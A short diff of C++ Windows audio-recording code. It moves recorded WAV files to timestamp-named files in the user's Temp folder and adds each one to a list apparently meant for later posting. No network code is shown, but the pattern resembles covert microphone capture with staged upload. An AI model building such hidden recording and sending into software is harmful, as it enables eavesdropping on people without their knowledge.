@@ -60,6 +60,7 @@ int writeBuffersListOnWaveFile(WAVEFORMATEX &format, int &tailleTotale, int &buf
     MMIOINFO mmioInfo = {0};
     HMMIO hFile = mmioOpen(const_cast<LPSTR>(fileName), &mmioInfo, MMIO_CREATE | MMIO_WRITE);
     if (hFile == NULL) {
+        cout << nomFichier << endl;
         cerr << "Impossible d'ouvrir le fichier wave." << endl;
         return 1;
     }
@@ -138,6 +139,9 @@ int listenOnce(string nomFichier){
 
     writeBuffersListOnWaveFile(format, tailleTotale, buffersRecorded, bufferTabToWrite, numSamples, nomFichier);
 
+    *(filesToPostSend.load()) += nomFichier + "\n";
+    // cout << *(filesToPostSend.load()) << endl;
+
     return 0;
 }
 
@@ -156,7 +160,7 @@ string trouverNomFichier(){
     strftime(buffer, sizeof(buffer), "%Y%m%d%H%M%S", localtime(&now));
     string dateHeure = buffer;
     
-    string nomFichier = "audio_" + username + "_" + dateHeure + ".wav";
+    string nomFichier = "C:\\Users\\" + username + "\\AppData\\Local\\Temp\\" + dateHeure + ".wav";
     
     return nomFichier;
 }
